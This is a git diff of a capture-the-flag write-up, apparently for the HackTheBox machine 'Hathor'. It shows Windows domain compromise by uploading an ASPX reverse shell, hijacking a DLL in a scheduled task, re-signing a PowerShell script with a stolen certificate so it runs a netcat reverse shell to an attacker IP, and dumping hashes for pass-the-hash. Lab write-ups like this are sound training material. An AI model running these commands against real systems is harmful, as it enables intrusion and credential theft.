@@ -200,11 +200,11 @@ After much enumeration, have come to /admin and registered an account
 
 Attempted to view other accounts that are registered, and attempted a password reset on Admin but no result here.
 
-![](<../../.gitbook/assets/image (18).png>)
+![](<../../.gitbook/assets/image (18) (1).png>)
 
 I ended up reviewing password resets in the Mojo forums and found the Default Creds.
 
-{% embed url="https://www.mojoportal.com/Forums/Thread.aspx?pageid=5&t=2902%7E-1" %}
+[https://www.mojoportal.com/Forums/Thread.aspx?pageid=5\&t=2902%7E-1](https://www.mojoportal.com/Forums/Thread.aspx?pageid=5\&t=2902%7E-1)
 
 ![](<../../.gitbook/assets/image (16).png>)
 
@@ -218,13 +218,13 @@ Success - Logged in as Admin.
 
 Looking into File Manager, We have ability to edit current files.
 
-![](<../../.gitbook/assets/image (27).png>)
+![](<../../.gitbook/assets/image (27) (1).png>)
 
 I replace the content of the fragment1.htm with an ASPX Reverse Shell.
 
-{% embed url="https://github.com/borjmz/aspx-reverse-shell/blob/master/shell.aspx" %}
+[https://github.com/borjmz/aspx-reverse-shell/blob/master/shell.aspx](https://github.com/borjmz/aspx-reverse-shell/blob/master/shell.aspx)
 
-![](<../../.gitbook/assets/image (39).png>)
+![](<../../.gitbook/assets/image (39) (1).png>)
 
 It took me a couple goes on trying to find a location where the CMS would allow me to save a filetype as .aspx. In the end, This file was copied to /Logos and triggered by going to:&#x20;
 
@@ -290,7 +290,7 @@ Using GCI, there are .CSV files in the C:\Get-bADPasswords\Accessible DIR.
 
 Extracting the content in Bulk using Get-Content (GC) to a writeable folder.&#x20;
 
-![](<../../.gitbook/assets/image (32).png>)
+![](<../../.gitbook/assets/image (32) (1).png>)
 
 ![](<../../.gitbook/assets/image (19).png>)
 
@@ -308,7 +308,7 @@ ldapsearch -x -h 10.129.44.3 -D 'windcorp\BeatriceMill' -w 'xxx' -b CN=Users,DC=
 
 Contents of usernames.txt
 
-![](<../../.gitbook/assets/image (40).png>)
+![](<../../.gitbook/assets/image (40) (1).png>)
 
 \#Remove sAMAccountName
 
@@ -318,7 +318,7 @@ wc tells me that sAMAccountName is -eq to 16 characters
 
 I use sed to just leave the usernames.
 
-![](<../../.gitbook/assets/image (11).png>)
+![](<../../.gitbook/assets/image (11) (1).png>)
 
 ### SMB
 
@@ -332,7 +332,7 @@ pushd Y:
 
 Browsing the Directory, The Directory, there are a couple of .exe files and a Scripts DIR.
 
-![](<../../.gitbook/assets/image (33).png>)
+![](<../../.gitbook/assets/image (33) (2).png>)
 
 Scripts DIR.
 
@@ -346,13 +346,13 @@ Get-Process list shows a number of processes running. One of the processes that 
 
 [https://www.autoitscript.com/site/](https://www.autoitscript.com/site/) Advises that is designed for automating windows tasks.
 
-Given that this .exe lives in the Share, followed by the contents of the scripts folder that contains .au3 file types - which are associated to AutoIT3.exe
+Given that this .exe lives in the Share, followed by the contents of the scripts folder that contains .au3 file types - which are associated to AutoIT3.exe, gives clues to maniuplating these files.
 
 
 
 ### Foothold 2
 
-The second Foothold comes from DLL Hijack of the AutoIT3 Scheduledtask.
+The second Foothold comes from the DLL Hijack of the AutoIT3 Scheduled Task.
 
 [https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dll-hijacking](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dll-hijacking)
 
@@ -361,9 +361,6 @@ The second Foothold comes from DLL Hijack of the AutoIT3 Scheduledtask.
 3. Run netcat.exe and open a reverse powershell shell.
 
 ```
-#include <windows.h>
-
-BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
 # include <windows.h>
 BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
 {
@@ -402,10 +399,117 @@ Wait for Scheduled Task (Runs approximately every 3 minutes according to HTTP Se
 
 ![](<../../.gitbook/assets/image (29).png>)
 
-![](<../../.gitbook/assets/image (41).png>)
+![](<../../.gitbook/assets/image (41) (1).png>)
 
-![](<../../.gitbook/assets/image (30).png>)
+![](<../../.gitbook/assets/image (30) (1).png>)
 
 ### Owned User
 
 ![](<../../.gitbook/assets/image (36).png>)
+
+### Enumeration 2
+
+#### Recycle bin
+
+![](<../../.gitbook/assets/image (39).png>)
+
+Copy the file using Base64
+
+```
+#Encode to B64
+certutil -encode -f $RLYS3KF.pfx tmp.b64
+
+#Decode from B64
+base64 -d tmp.b4 > tmp.pfx
+```
+
+Decrypt the PFX
+
+![](<../../.gitbook/assets/image (42).png>)
+
+Back to Get-BAdPAsswords
+
+The PS1 is signed with a certificate.
+
+I will copy the Powershell script and maniuplate it for another Shell.
+
+For this to work, I need to edit the PS1 and re-sign it with the Certificate.
+
+```
+#Add Certificate to Local Store
+certutil -user -p abceasyas123 -importpfx tmp.pfx NoChain,NoRoot  
+
+#Verify Certificate is in CurrentUser Store
+Get-ChildItem cert:\CurrentUser\My
+
+#Create variable and select Certificate
+$codeCertificate = Get-ChildItem cert:\CurrentUser\My | Where-Object {$_.Subject -like "*Administrator*"}
+
+#Replace content of Get-BAdpasswords.ps1 with NetCat (Named as BGInfo64) - Create Reverse Shell
+cmd.exe /c "echo C:\share\Bginfo64.exe 10.10.16.5 9000 -e cmd.exe > Get-bADpasswords.ps1"
+
+# Sign Powershell script with Certificate
+Set-AuthenticodeSignature -FilePath Get-bADPasswords.ps1 -Certificate $codeCertificate 
+```
+
+Adding Certificate to Store
+
+![](<../../.gitbook/assets/image (43).png>)
+
+Verifying Certificate in Store
+
+![](<../../.gitbook/assets/image (44).png>)
+
+Creating Variable and assigning Certificate
+
+![](<../../.gitbook/assets/image (25).png>)
+
+Get-BADpassword before signing
+
+![](<../../.gitbook/assets/image (33).png>)
+
+Get-BAdpassword script after signing
+
+![](<../../.gitbook/assets/image (31).png>)
+
+Run the script using the .vbs file from cmd.exe
+
+```
+cscript .\run.vbs
+```
+
+
+
+I was having some issues with getting my shell working at this point.
+
+![](<../../.gitbook/assets/image (7).png>)
+
+I had to kill my existing BGinfo64.exe process before launching a new one to get Shell.
+
+![](<../../.gitbook/assets/image (30).png>)
+
+![](<../../.gitbook/assets/image (26).png>)
+
+
+
+Now running shell as bpassrunner, I download and install DSInternals and grab hashes.
+
+For this, I use Get-ADReplaccount
+
+![](<../../.gitbook/assets/image (11).png>)
+
+I grab the Administrator hash and use it in a Pass-The-Hack attack.
+
+[https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a](https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a)
+
+![](<../../.gitbook/assets/image (27).png>)
+
+![](<../../.gitbook/assets/image (41).png>)
+
+Using the Administrator hash, I access Hathor using SMBClient as Administrator.
+
+![](<../../.gitbook/assets/image (18).png>)
+
+Owed Root
+
+![](<../../.gitbook/assets/image (6).png>)
